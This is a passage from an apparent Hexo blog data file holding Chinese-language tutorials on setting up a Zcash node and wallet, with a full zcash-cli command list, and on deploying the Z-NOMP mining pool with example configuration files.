&quot;node&quot; )\ngetconnectioncount\ngetnettotals\ngetnetworkinfo\ngetpeerinfo\nlistbanned\nping\nsetban &quot;ip(/netmask)&quot; &quot;add|remove&quot; (bantime) (absolute)\n\n== Rawtransactions ==\ncreaterawtransaction [{&quot;txid&quot;:&quot;id&quot;,&quot;vout&quot;:n},...] {&quot;address&quot;:amount,...}\ndecoderawtransaction &quot;hexstring&quot;\ndecodescript &quot;hex&quot;\nfundrawtransaction &quot;hexstring&quot;\ngetrawtransaction &quot;txid&quot; ( verbose )\nsendrawtransaction &quot;hexstring&quot; ( allowhighfees )\nsignrawtransaction &quot;hexstring&quot; ( [{&quot;txid&quot;:&quot;id&quot;,&quot;vout&quot;:n,&quot;scriptPubKey&quot;:&quot;hex&quot;,&quot;redeemScript&quot;:&quot;hex&quot;},...] [&quot;privatekey1&quot;,...] sighashtype )\n\n== Util ==\ncreatemultisig nrequired [&quot;key&quot;,...]\nestimatefee nblocks\nestimatepriority nblocks\nvalidateaddress &quot;zcashaddress&quot;\nverifymessage &quot;zcashaddress&quot; &quot;signature&quot; &quot;message&quot;\nz_validateaddress &quot;zaddr&quot;\n\n== Wallet ==\naddmultisigaddress nrequired [&quot;key&quot;,...] ( &quot;account&quot; )\nbackupwallet &quot;destination&quot;\ndumpprivkey &quot;zcashaddress&quot;\ndumpwallet &quot;filename&quot;\nencryptwallet &quot;passphrase&quot;\ngetaccount &quot;zcashaddress&quot;\ngetaccountaddress &quot;account&quot;\ngetaddressesbyaccount &quot;account&quot;\ngetbalance ( &quot;account&quot; minconf includeWatchonly )\ngetnewaddress ( &quot;account&quot; )\ngetrawchangeaddress\ngetreceivedbyaccount &quot;account&quot; ( minconf )\ngetreceivedbyaddress &quot;zcashaddress&quot; ( minconf )\ngettransaction &quot;txid&quot; ( includeWatchonly )\ngetunconfirmedbalance\ngetwalletinfo\nimportaddress &quot;address&quot; ( &quot;label&quot; rescan )\nimportprivkey &quot;zcashprivkey&quot; ( &quot;label&quot; rescan )\nimportwallet &quot;filename&quot;\nkeypoolrefill ( newsize )\nlistaccounts ( minconf includeWatchonly)\nlistaddressgroupings\nlistlockunspent\nlistreceivedbyaccount ( minconf includeempty includeWatchonly)\nlistreceivedbyaddress ( minconf includeempty includeWatchonly)\nlistsinceblock ( &quot;blockhash&quot; target-confirmations includeWatchonly)\nlisttransactions ( &quot;account&quot; count from includeWatchonly)\nlistunspent ( minconf maxconf  [&quot;address&quot;,...] )\nlockunspent unlock [{&quot;txid&quot;:&quot;txid&quot;,&quot;vout&quot;:n},...]\nmove &quot;fromaccount&quot; &quot;toaccount&quot; amount ( minconf &quot;comment&quot; )\nsendfrom &quot;fromaccount&quot; &quot;tozcashaddress&quot; amount ( minconf &quot;comment&quot; &quot;comment-to&quot; )\nsendmany &quot;fromaccount&quot; {&quot;address&quot;:amount,...} ( minconf &quot;comment&quot; [&quot;address&quot;,...] )\nsendtoaddress &quot;zcashaddress&quot; amount ( &quot;comment&quot; &quot;comment-to&quot; subtractfeefromamount )\nsetaccount &quot;zcashaddress&quot; &quot;account&quot;\nsettxfee amount\nsignmessage &quot;zcashaddress&quot; &quot;message&quot;\nz_exportkey &quot;zaddr&quot;\nz_exportviewingkey &quot;zaddr&quot;\nz_exportwallet &quot;filename&quot;\nz_getbalance &quot;address&quot; ( minconf )\nz_getnewaddress\nz_getoperationresult ([&quot;operationid&quot;, ... ]) \nz_getoperationstatus ([&quot;operationid&quot;, ... ]) \nz_gettotalbalance ( minconf includeWatchonly )\nz_importkey &quot;zkey&quot; ( rescan startHeight )\nz_importviewingkey &quot;vkey&quot; ( rescan startHeight )\nz_importwallet &quot;filename&quot;\nz_listaddresses ( includeWatchonly )\nz_listoperationids\nz_listreceivedbyaddress &quot;address&quot; ( minconf )\nz_sendmany &quot;fromaddress&quot; [{&quot;address&quot;:... ,&quot;amount&quot;:...},...] ( minconf ) ( fee )\nz_shieldcoinbase &quot;fromaddress&quot; &quot;tozaddress&quot; ( fee ) ( limit )\nzcbenchmark benchmarktype samplecount\nzcrawjoinsplit rawtx inputs outputs vpub_old vpub_new\nzcrawkeygen\nzcrawreceive zcsecretkey encryptednote\nzcsamplejoinsplit\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>Zcash (ZEC)是首个使用零知识证明机制的区块链系统，它可提供完全的支付保密性，同时仍能够使用公有区块链来维护一个去中心化网络。与比特币相同的是，Zcash代币（ZEC）的总量也是2100万，不同之处在于，Zcash交易自动隐藏区块链上所有交易的发送者、接受者及数额。只用那些拥有查看秘钥的人才能看到交易的内容。用户拥有完全的控制权，他们可自行选择向其他人提供查看秘钥.  ZCash 是 bitcoin 的分支，保留了 bitcoin 原有的模式，基于比特币 0.11.2 版代码修改的。 ZCash 钱包资金分 2 种：透明资金、私有资金，透明资金类似比特币资金；私有资金加强了 隐私性，涉及到私有资金的交易是保密不可查的，透明资金与透明资金的交易是公开可查的.</p>\n<p>目前Zcash流通市值在12亿美元左右，每日交易额也高达1亿美元，其使用zero-knowledge proof（零知识证明）使得数字化货币更加具有安全性；隐私性而备受市场关注。</p>\n</blockquote>\n<p>现在zcash官方提供的钱包是linux版本的，而原因是zcash团队没人熟悉gui，不过zcash官方提供了编译后的可执行程序，这里也不用我们来进行编译了。</p>\n<p>下载地址 ： <a href=\"https://z.cash/downloads/zcash-1.0.14-linux64.tar.gz\" target=\"_blank\" rel=\"noopener\">https://z.cash/downloads/zcash-1.0.14-linux64.tar.gz</a><br>hash     :  352ea2a67ae3484046a6bd43af9a5ce125e2d103a6a32ac71805658918f7076a</p>\n<p>下载后请务必进行哈希值验证，以保证文件的真实和准确性。</p>\n<p>tar -xvf zcash-1.0.14-linux64.tar.gz       //解压缩<br>mv -t /usr/local/bin/ zcash-1.0.14/bin/*   //移动可执行文件</p>\n<pre><code>现在我们已经安装了zcash，运行下面的命令下载 key ，用于创建和验证参数。\n\nzcash-fetch-params\n\n这里由于国内网络的原因，可能会失败，请多试几次。\n\n验证通过后，我们需要对客户端进行配置。\n\nmkdir ~/.zcash //创建zcash目录\n\nvim zcash.conf \n\n以上按照个人配置的不同，设置不同的配置文件，下面提供一个配置供参考。\n\n//这是测试链接的配置\naddnode=testnet.z.cash    //节点\nrpcuser=test              //rpc用户名\nrpcpassword=test          //rpc密码\ngen=0                     //屏蔽cpu挖矿\ntestnet=1                 //开启测试链\nrpcallowip=100.100.60.10 //允许访问的IP\nrpcport=8333             //rpc端口号\nequihashsolver=tromp     //指定算法，非挖矿钱包可以删除\n\n\n好了，保存后输入zcashd就可以启动zcash客户端了，也可以使用zcashd -daemon在后台运行zcash客户端,在shell输入zcash-cli getinfo命令就可以看到网络和块信息了。\n\n下面提供一些zcash节点常用命令：\n\nzcash-cli getinfo                           //显示节点信息\nzcashd -daemon                              //后台启动zcash守护\nzcash-cli getnetworkhashps                  //获取全网算力\nzcash-cli z_getnewaddress                    //生成一个Z-addr\nzcash-cli getnewaddress                      //生成一个t-addr                   \nzcas-cli getblockhash                       //区块高度\nzcash-cli getaddressesbyaccount &quot;&quot;         //显示所有t-addr钱包\nzcash-cli z_listaddresses                   //显示所有Z-addr钱包\nzcash-cli z_getbalance &quot;&quot;                   //z钱包余额\n\n如果有其他的需要，可以使用zcash-cli help来查看zcash的全部命令。\n\n\n附1：\n\nzcash钱包配置：\n\n//这里是zcash钱包主链配置\n\nrpcuser=rpc用户名\nrpcpassword=rpc密码\nrpcport=rpc端口\nrpcallowip=允许链接rpc ip地址\nserver=1        //打开服务\ndaemon=1        //后台运行守护\nmainnet=1       //主链\naddnode=mainnet.z.cash //主链节点\n\n附2：\n\n//zcash命令\n\n== Blockchain ==\ngetbestblockhash\ngetblock &quot;hash|height&quot; ( verbose )\ngetblockchaininfo\ngetblockcount\ngetblockhash index\ngetblockheader &quot;hash&quot; ( verbose )\ngetchaintips\n</code></pre><p>getdifficulty<br>getmempoolinfo<br>getrawmempool ( verbose )<br>        gettxout “txid” n ( includemempool )<br>        gettxoutproof [“txid”,…] ( blockhash )<br>        gettxoutsetinfo<br>        verifychain ( checklevel numblocks )<br>        verifytxoutproof “proof”</p>\n<pre><code>== Control ==\ngetinfo\nhelp ( &quot;command&quot; )\nstop\n\n== Disclosure ==\nz_getpaymentdisclosure &quot;txid&quot; &quot;js_index&quot; &quot;output_index&quot; (&quot;message&quot;) \nz_validatepaymentdisclosure &quot;paymentdisclosure&quot;\n\n== Generating ==\ngenerate numblocks\ngetgenerate\nsetgenerate generate ( genproclimit )\n\n== Mining ==\ngetblocksubsidy height\ngetblocktemplate ( &quot;jsonrequestobject&quot; )\ngetlocalsolps\ngetmininginfo\ngetnetworkhashps ( blocks height )\ngetnetworksolps ( blocks height )\nprioritisetransaction &lt;txid&gt; &lt;priority delta&gt; &lt;fee delta&gt;\nsubmitblock &quot;hexdata&quot; ( &quot;jsonparametersobject&quot; )\n\n== Network ==\naddnode &quot;node&quot; &quot;add|remove|onetry&quot;\nclearbanned\ndisconnectnode &quot;node&quot; \ngetaddednodeinfo dns ( &quot;node&quot; )\ngetconnectioncount\ngetnettotals\ngetnetworkinfo\ngetpeerinfo\nlistbanned\nping\nsetban &quot;ip(/netmask)&quot; &quot;add|remove&quot; (bantime) (absolute)\n\n== Rawtransactions ==\ncreaterawtransaction [{&quot;txid&quot;:&quot;id&quot;,&quot;vout&quot;:n},...] {&quot;address&quot;:amount,...}\ndecoderawtransaction &quot;hexstring&quot;\ndecodescript &quot;hex&quot;\nfundrawtransaction &quot;hexstring&quot;\ngetrawtransaction &quot;txid&quot; ( verbose )\nsendrawtransaction &quot;hexstring&quot; ( allowhighfees )\nsignrawtransaction &quot;hexstring&quot; ( [{&quot;txid&quot;:&quot;id&quot;,&quot;vout&quot;:n,&quot;scriptPubKey&quot;:&quot;hex&quot;,&quot;redeemScript&quot;:&quot;hex&quot;},...] [&quot;privatekey1&quot;,...] sighashtype )\n\n== Util ==\ncreatemultisig nrequired [&quot;key&quot;,...]\nestimatefee nblocks\nestimatepriority nblocks\nvalidateaddress &quot;zcashaddress&quot;\nverifymessage &quot;zcashaddress&quot; &quot;signature&quot; &quot;message&quot;\nz_validateaddress &quot;zaddr&quot;\n\n== Wallet ==\naddmultisigaddress nrequired [&quot;key&quot;,...] ( &quot;account&quot; )\nbackupwallet &quot;destination&quot;\ndumpprivkey &quot;zcashaddress&quot;\ndumpwallet &quot;filename&quot;\nencryptwallet &quot;passphrase&quot;\ngetaccount &quot;zcashaddress&quot;\ngetaccountaddress &quot;account&quot;\ngetaddressesbyaccount &quot;account&quot;\ngetbalance ( &quot;account&quot; minconf includeWatchonly )\ngetnewaddress ( &quot;account&quot; )\ngetrawchangeaddress\ngetreceivedbyaccount &quot;account&quot; ( minconf )\ngetreceivedbyaddress &quot;zcashaddress&quot; ( minconf )\ngettransaction &quot;txid&quot; ( includeWatchonly )\ngetunconfirmedbalance\ngetwalletinfo\nimportaddress &quot;address&quot; ( &quot;label&quot; rescan )\nimportprivkey &quot;zcashprivkey&quot; ( &quot;label&quot; rescan )\nimportwallet &quot;filename&quot;\nkeypoolrefill ( newsize )\nlistaccounts ( minconf includeWatchonly)\nlistaddressgroupings\nlistlockunspent\nlistreceivedbyaccount ( minconf includeempty includeWatchonly)\nlistreceivedbyaddress ( minconf includeempty includeWatchonly)\nlistsinceblock ( &quot;blockhash&quot; target-confirmations includeWatchonly)\nlisttransactions ( &quot;account&quot; count from includeWatchonly)\nlistunspent ( minconf maxconf  [&quot;address&quot;,...] )\nlockunspent unlock [{&quot;txid&quot;:&quot;txid&quot;,&quot;vout&quot;:n},...]\nmove &quot;fromaccount&quot; &quot;toaccount&quot; amount ( minconf &quot;comment&quot; )\nsendfrom &quot;fromaccount&quot; &quot;tozcashaddress&quot; amount ( minconf &quot;comment&quot; &quot;comment-to&quot; )\nsendmany &quot;fromaccount&quot; {&quot;address&quot;:amount,...} ( minconf &quot;comment&quot; [&quot;address&quot;,...] )\nsendtoaddress &quot;zcashaddress&quot; amount ( &quot;comment&quot; &quot;comment-to&quot; subtractfeefromamount )\nsetaccount &quot;zcashaddress&quot; &quot;account&quot;\nsettxfee amount\nsignmessage &quot;zcashaddress&quot; &quot;message&quot;\nz_exportkey &quot;zaddr&quot;\nz_exportviewingkey &quot;zaddr&quot;\nz_exportwallet &quot;filename&quot;\nz_getbalance &quot;address&quot; ( minconf )\nz_getnewaddress\nz_getoperationresult ([&quot;operationid&quot;, ... ]) \nz_getoperationstatus ([&quot;operationid&quot;, ... ]) \nz_gettotalbalance ( minconf includeWatchonly )\nz_importkey &quot;zkey&quot; ( rescan startHeight )\nz_importviewingkey &quot;vkey&quot; ( rescan startHeight )\nz_importwallet &quot;filename&quot;\nz_listaddresses ( includeWatchonly )\nz_listoperationids\nz_listreceivedbyaddress &quot;address&quot; ( minconf )\nz_sendmany &quot;fromaddress&quot; [{&quot;address&quot;:... ,&quot;amount&quot;:...},...] ( minconf ) ( fee )\nz_shieldcoinbase &quot;fromaddress&quot; &quot;tozaddress&quot; ( fee ) ( limit )\nzcbenchmark benchmarktype samplecount\nzcrawjoinsplit rawtx inputs outputs vpub_old vpub_new\nzcrawkeygen\nzcrawreceive zcsecretkey encryptednote\nzcsamplejoinsplit\n</code></pre>"},{"title":"zcash矿池之Z-NOMP(Node Open Mining Portal)","comments":0,"date":"2018-03-02T05:00:28.000Z","img":null,"_content":"\n**Zcash作为采用零知识证明（zk-SNARKS）实现完全隐私保护的加密货币,在技术地位上成为竞争币一哥指日可待.**\n\nz-classic在github发布的矿池Z-NOMP，是基于Node Open Mining Portal的Equihash矿池，可以部署的币种有zen，zcl和zec等使用Equihash算法的矿池。\n\n**警告:请勿直接用于生产环境使用该软件,任何内容的修改都会对矿池造成损失.**\n\n首先，部署环境，我们使用的是ubuntu server 16.04 x64的系统。\n  \n1.安装z-nomp依赖：\n  \n``` shell\n    sudo apt-get install update\n    sudo apt-get install build-essential libsodium-dev npm git\n    sudo npm install n -g\n    sudo n 8.9.4\n```\n\n2.下载和安装z-nomp：\n\n``` shell\n\tgit clone https://github.com/joshuayabut/node-open-mining-portal.git /pool\n\tcd /pool\n\tnpm config set registry https://registry.npm.taobao.org  #使用淘宝npm镜像\n\tnpm update\n\tsudo npm install   #就算root账户也一定要加sudo\n```\n\n3.矿池配置文件：\n修改示例文件config_example.json。\n\n``` shell\n\tmv config_example.json config.json\n\tvim config.json\n```\n\n下面提供一些主要配置说明：\n``` json\n\t\"redis\": {\n\t\t\"host\": \"127.0.0.1\",   #redis地址\n\t\t\"port\": 6379,          #redis端口\n\t\t\"password\": \"\"      #redis密码\n\t}\n    },\n\t    \n\t\"website\": {\n\t\t\"enabled\": true,\n\t\t\"host\": \"0.0.0.0\",                 #website地址\n\t\t\"port\": 8080,                      #website端口\n\t\t\"stratumHost\": \"cryppit.com\",      #挖矿域名    \n\t\t\"stats\": {\n\t\t\t\"updateInterval\": 30,\n\t\t\t\"historicalRetention\": 14400,\n\t\t\t\"hashrateWindow\": 300\n\t\t},\n\t\t\t\t\t\t\t           \n\t\t\"tlsOptions\" : {\n\t\t\t\"enabled\": false,          #ssl挖矿\n\t\t\t\"cert\": \"\",                #ssl公钥地址\n\t\t\t\"key\": \"\"                  #ssl私钥地址\n\t\t}\n\t},\n```\n\n4.数字货币配置：\n\n进入pool_config，重新命名zcash_example.json为zcash.json并修改示例内容.\n\n``` shell\n\tcd pool_config\n\tmv zcash_example.json zcash.json\n\tvim zcash.json\n```\n\n主要配置文件说明：\n\n``` json\n\t\"enabled\": true,         #设置打开coin\n\t\"coin\": \"zcash.json\",    #coin配置文件\n\t\"address\": \"\",           #coinbase地址，即挖到块后保存的地址，且该地址一定要在节点中 \n\t\"zAddress\": \"\",          #Z地址\n\t\"tAddress\": \"\",          #T地址\n\n\t\"rewardRecipients\": {\n\t\t\"\": 0.2,             #手续费和接收手续费地址\n\t},\n\n\t\"paymentProcessing\": {\n\t\t\"minConf\": 10,\n\t\t\"enabled\": false,             #支付进程\n\t\t\"paymentMode\": \"prop\",        #挖矿模式\n\t\t\"_comment_paymentMode\":\"prop, pplnt\",\n\t\t\"paymentInterval\": 20, \n\t\t\"minimumPayment\": 0.1,         #最低支付额\n\t\t\"maxBlocksPerPayment\": 1,     \n\t\t\"daemon\": {                    #节点信息 这里为支付节点\n\t\t\t\"host\": \"127.0.0.1\",       \n\t\t\t\"port\": 19332,\n\t\t\t\"user\": \"testuser\",\n\t\t\t\"password\": \"testpass\"\n\t\t}\n\t},\n\t\n\t\"ports\": {                 #支付端口和难度\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t         \n\t\t\"3032\": {\n\t\t\"diff\": 0.05,\n\t\t\"tls\": false,\n\t\t\"varDiff\": {\n\t\t\t\"minDiff\": 0.04,\n\t\t\t\"maxDiff\": 16,\n\t\t\t\"targetTime\": 15,\n\t\t\t\"retargetTime\": 60,\n\t\t\t\"variancePercent\": 30\n\t\t}\n\t}\n\t},\n\t\n\t\"daemons\": [                #节点  这里为挖矿节点 可与支付节点一致\n\t\t{\n\t\t\t\"host\": \"127.0.0.1\",\n\t\t\t\"port\": 18232,\n\t\t\t\"user\": \"rpcuser\",\n\t\t\t\"password\": \"rpcpassword\"\n\t\t}\n    ],\n```\n\n5.coin配置：\n\n进入coins目录可以看到开发者提供了zclassic和zcash等coin的配置文件，同时zcash_testnet.json为zcash的testnet方便测试，使用testnet进行测试时请保证节点一定在testnet模式。如果需要加增加coin请参考开发者提供的其他coin信息进行修改，同时在pool_config里增加池信息，以后我们在进行陆续说明。\n\nok，现在已经配置完成，我们返回/pool目录 ，使用npm start 来启动z-nomp 矿池，就可以把矿机接入来进行挖矿了。\n","source":"_posts/zcash矿池之Z-NOMP-Node-Open-Mining-Portal.md","raw":"---\ntitle: zcash矿池之Z-NOMP(Node Open Mining Portal)\ncomments: false\ndate: 2018-03-02 13:00:28\ncategories: 矿池\ntags: \n- lucas556 \n- 矿池 \n- zcash\nimg:\n---\n\n**Zcash作为采用零知识证明（zk-SNARKS）实现完全隐私保护的加密货币,在技术地位上成为竞争币一哥指日可待.**\n\nz-classic在github发布的矿池Z-NOMP，是基于Node Open Mining Portal的Equihash矿池，可以部署的币种有zen，zcl和zec等使用Equihash算法的矿池。\n\n**警告:请勿直接用于生产环境使用该软件,任何内容的修改都会对矿池造成损失.**\n\n首先，部署环境，我们使用的是ubuntu server 16.04 x64的系统。\n  \n1.安装z-nomp依赖：\n  \n``` shell\n    sudo apt-get install update\n    sudo apt-get install build-essential libsodium-dev npm git\n    sudo npm install n -g\n    sudo n 8.9.4\n```\n\n2.下载和安装z-nomp：\n\n``` shell\n\tgit clone https://github.com/joshuayabut/node-open-mining-portal.git /pool\n\tcd /pool\n\tnpm config set registry https://registry.npm.taobao.org  #使用淘宝npm镜像\n\tnpm update\n\tsudo npm install   #就算root账户也一定要加sudo\n```\n\n3.矿池配置文件：\n修改示例文件config_example.json。\n\n``` shell\n\tmv config_example.json config.json\n\tvim config.json\n```\n\n下面提供一些主要配置说明：\n``` json\n\t\"redis\": {\n\t\t\"host\": \"127.0.0.1\",   #redis地址\n\t\t\"port\": 6379,          #redis端口\n\t\t\"password\": \"\"      #redis密码\n\t}\n    },\n\t    \n\t\"website\": {\n\t\t\"enabled\": true,\n\t\t\"host\": \"0.0.0.0\",                 #website地址\n\t\t\"port\": 8080,                      #website端口\n\t\t\"stratumHost\": \"cryppit.com\",      #挖矿域名    \n\t\t\"stats\": {\n\t\t\t\"updateInterval\": 30,\n\t\t\t\"historicalRetention\": 14400,\n\t\t\t\"hashrateWindow\": 300\n\t\t},\n\t\t\t\t\t\t\t           \n\t\t\"tlsOptions\" : {\n\t\t\t\"enabled\": false,          #ssl挖矿\n\t\t\t\"cert\": \"\",                #ssl公钥地址\n\t\t\t\"key\": \"\"                  #ssl私钥地址\n\t\t}\n\t},\n```\n\n4.数字货币配置：\n\n进入pool_config，重新命名zcash_example.json为zcash.json并修改示例内容.\n\n``` shell\n\tcd pool_config\n\tmv zcash_example.json zcash.json\n\tvim zcash.json\n```\n\n主要配置文件说明：\n\n``` json\n\t\"enabled\": true,         #设置打开coin\n\t\"coin\": \"zcash.json\",    #coin配置文件\n\t\"address\": \"\",           #coinbase地址，即挖到块后保存的地址，且该地址一定要在节点中 \n\t\"zAddress\": \"\",          #Z地址\n\t\"tAddress\": \"\",          #T地址\n\n\t\"rewardRecipients\": {\n\t\t\"\": 0.2,             #手续费和接收手续费地址\n\t},\n\n\t\"paymentProcessing\": {\n\t\t\"minConf\": 10,\n\t\t\"enabled\": false,             #支付进程\n\t\t\"paymentMode\": \"prop\",        #挖矿模式\n\t\t\"_comment_paymentMode\":\"prop, pplnt\",\n\t\t\"paymentInterval\": 20, \n\t\t\"minimumPayment\": 0.1,         #最低支付额\n\t\t\"maxBlocksPerPayment\": 1,     \n\t\t\"daemon\": {                    #节点信息 这里为支付节点\n\t\t\t\"host\": \"127.0.0.1\",       \n\t\t\t\"port\": 19332,\n\t\t\t\"user\": \"testuser\",\n\t\t\t\"password\": \"testpass\"\n\t\t}\n\t},\n\t\n\t\"ports\": {                 #支付端口和难度\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t         \n\t\t\"3032\": {\n\t\t\"diff\": 0.05,\n\t\t\"tls\": false,\n\t\t\"varDiff\": {\n\t\t\t\"minDiff\": 0.04,\n\t\t\t\"maxDiff\": 16,\n\t\t\t\"targetTime\": 15,\n\t\t\t\"retargetTime\": 60,\n\t\t\t\"variancePercent\": 30\n\t\t}\n\t}\n\t},\n\t\n\t\"daemons\": [                #节点  这里为挖矿节点 可与支付节点一致\n\t\t{\n\t\t\t\"host\": \"127.0.0.1\",\n\t\t\t\"port\": 18232,\n\t\t\t\"user\": \"rpcuser\",\n\t\t\t\"password\": \"rpcpassword\"\n\t\t}\n    ],\n```\n\n5.coin配置：\n\n进入coins目录可以看到开发者提供了zclassic和zcash等coin的配置文件，同时zcash_testnet.json为zcash的testnet方便测试，使用testnet进行测试时请保证节点一定在testnet模式。如果需要加增加coin请参考开发者提供的其他coin信息进行修改，同时在pool_config里增加池信息，以后我们在进行陆续说明。\n\nok，现在已经配置完成，我们返回/pool目录 ，使用npm start 来启动z-nomp 矿池，就可以把矿机接入来进行挖矿了。\n","slug":"zcash矿池之Z-NOMP-Node-Open-Mining-Portal","published":1,"updated":"2018-03-09T09:32:59.581Z","layout":"post","photos":[],"link":"","_id":"cjf7piav4000apkworz2aw7jj","content":"<p><strong>Zcash作为采用零知识证明（zk-SNARKS）实现完全隐私保护的加密货币,在技术地位上成为竞争币一哥指日可待.</strong></p>\n<p>z-classic在github发布的矿池Z-NOMP，是基于Node Open Mining Portal的Equihash矿池，可以部署的币种有zen，zcl和zec等使用Equihash算法的矿池。</p>\n<p><strong>警告:请勿直接用于生产环境使用该软件,任何内容的修改都会对矿池造成损失.</strong></p>\n<p>首先，部署环境，我们使用的是ubuntu server 16.04 x64的系统。</p>\n<p>1.安装z-nomp依赖：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install update</span><br><span class=\"line\">sudo apt-get install build-essential libsodium-dev npm git</span><br><span class=\"line\">sudo npm install n -g</span><br><span class=\"line\">sudo n 8.9.4</span><br></pre></td></tr></table></figure>\n<p>2.下载和安装z-nomp：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/joshuayabut/node-open-mining-portal.git /pool</span><br><span class=\"line\">cd /pool</span><br><span class=\"line\">npm config set registry https://registry.npm.taobao.org  #使用淘宝npm镜像</span><br><span class=\"line\">npm update</span><br><span class=\"line\">sudo npm install   #就算root账户也一定要加sudo</span><br></pre></td></tr></table></figure>\n<p>3.矿池配置文件：<br>修改示例文件config_example.json。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mv config_example.json config.json</span><br><span class=\"line\">vim config.json</span><br></pre></td></tr></table></figure>\n<p>下面提供一些主要配置说明：<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"redis\": &#123;</span><br><span class=\"line\">\t\"host\": \"127.0.0.1\",   #redis地址</span><br><span class=\"line\">\t\"port\": 6379,          #redis端口</span><br><span class=\"line\">\t\"password\": \"\"      #redis密码</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">   &#125;,</span><br><span class=\"line\">    </span><br><span class=\"line\">\"website\": &#123;</span><br><span class=\"line\">\t\"enabled\": true,</span><br><span class=\"line\">\t\"host\": \"0.0.0.0\",                 #website地址</span><br><span class=\"line\">\t\"port\": 8080,                      #website端口</span><br><span class=\"line\">\t\"stratumHost\": \"cryppit.com\",      #挖矿域名    </span><br><span class=\"line\">\t\"stats\": &#123;</span><br><span class=\"line\">\t\t\"updateInterval\": 30,</span><br><span class=\"line\">\t\t\"historicalRetention\": 14400,</span><br><span class=\"line\">\t\t\"hashrateWindow\": 300</span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t\t\t\t\t\t           </span><br><span class=\"line\">\t\"tlsOptions\" : &#123;</span><br><span class=\"line\">\t\t\"enabled\": false,          #ssl挖矿</span><br><span class=\"line\">\t\t\"cert\": \"\",                #ssl公钥地址</span><br><span class=\"line\">\t\t\"key\": \"\"                  #ssl私钥地址</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure></p>\n<p>4.数字货币配置：</p>\n<p>进入pool_config，重新命名zcash_example.json为zcash.json并修改示例内容.</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd pool_config</span><br><span class=\"line\">mv zcash_example.json zcash.json</span><br><span class=\"line\">vim zcash.json</span><br></pre></td></tr></table></figure>\n<p>主要配置文件说明：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"enabled\": true,         #设置打开coin</span><br><span class=\"line\">\"coin\": \"zcash.json\",    #coin配置文件</span><br><span class=\"line\">\"address\": \"\",           #coinbase地址，即挖到块后保存的地址，且该地址一定要在节点中 </span><br><span class=\"line\">\"zAddress\": \"\",          #Z地址</span><br><span class=\"line\">\"tAddress\": \"\",          #T地址</span><br><span class=\"line\"></span><br><span class=\"line\">\"rewardRecipients\": &#123;</span><br><span class=\"line\">\t\"\": 0.2,             #手续费和接收手续费地址</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">\"paymentProcessing\": &#123;</span><br><span class=\"line\">\t\"minConf\": 10,</span><br><span class=\"line\">\t\"enabled\": false,             #支付进程</span><br><span class=\"line\">\t\"paymentMode\": \"prop\",        #挖矿模式</span><br><span class=\"line\">\t\"_comment_paymentMode\":\"prop, pplnt\",</span><br><span class=\"line\">\t\"paymentInterval\": 20, </span><br><span class=\"line\">\t\"minimumPayment\": 0.1,         #最低支付额</span><br><span class=\"line\">\t\"maxBlocksPerPayment\": 1,     </span><br><span class=\"line\">\t\"daemon\": &#123;                    #节点信息 